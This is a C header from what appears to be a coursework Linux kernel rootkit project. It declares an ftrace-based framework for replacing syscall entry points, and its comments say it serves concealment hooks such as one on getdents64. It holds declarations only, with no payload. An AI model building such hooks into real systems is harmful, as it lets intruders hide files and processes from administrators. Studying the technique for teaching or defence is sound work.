/* SPDX-License-Identifier: GPL-2.0 */
/*
 * syscall_hook.h - Generic syscall/function replacement framework (segment B).
 *
 * This is the "syscall replacement" deliverable of segment B. It replaces
 * existing kernel functions (typically syscall entry points) using ftrace,
 * as taught in TP03: no direct sys_call_table write, no CR0 WP patching.
 *
 * Segment C consumes this framework to install its concealment hooks (e.g.
 * getdents64). Segment B only provides the mechanism; it installs no hook of
 * its own except an optional, inert self-test (see module_core.c).
 *
 * Project constraint: the kill syscall must never be hooked.
 */
#ifndef ROOTKIT_B_SYSCALL_HOOK_H
#define ROOTKIT_B_SYSCALL_HOOK_H

#include <linux/ftrace.h>

/*
 * Describes one replacement.
 *
 * The caller fills name/function/original; install resolves address and sets
 * up ops. "original" points at the caller's function pointer variable, which
 * receives the address of the real function so the replacement can still call
 * through to it.
 */
struct ftrace_hook {
	const char *name;        /* symbol to replace, e.g. "__x64_sys_getdents64" */
	void *function;          /* replacement function                          */
	void *original;          /* &(caller's original fn pointer) -> gets filled */

	unsigned long address;   /* resolved address of name (set by install)     */
	struct ftrace_ops ops;   /* ftrace bookkeeping (set by install)           */
};

/*
 * Convenience initializer for a static hook table.
 *
 *   static struct ftrace_hook hooks[] = {
 *           HOOK("__x64_sys_getdents64", my_getdents64, &orig_getdents64),
 *   };
 */
#define HOOK(_name, _function, _original) \
	{ .name = (_name), .function = (_function), .original = (_original) }

/*
 * Install every hook in the table. On the first failure, all hooks already
 * installed by this call are removed before returning the error (all-or-
 * nothing). Returns 0 on success or a negative errno.
 */
int fh_install_hooks(struct ftrace_hook *hooks, size_t count);

/* Remove every hook previously installed from the table. */
void fh_remove_hooks(struct ftrace_hook *hooks, size_t count);

#endif /* ROOTKIT_B_SYSCALL_HOOK_H */
